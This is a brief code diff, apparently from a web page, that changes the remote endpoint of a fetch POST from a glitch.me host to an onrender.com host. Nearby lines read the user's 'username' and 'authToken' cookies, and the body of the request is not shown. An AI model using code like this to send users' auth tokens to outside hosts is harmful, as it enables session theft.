@@ -12,7 +12,7 @@
         const username = getCookie('username') || 'Bilinmeyen Kullanıcı';
         const authToken = getCookie('authToken') || 'Token Yok';
 
-        fetch('https://buttoned-mountainous-plier.glitch.me/get-code', {
+        fetch('https://katip.onrender.com/get-code', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
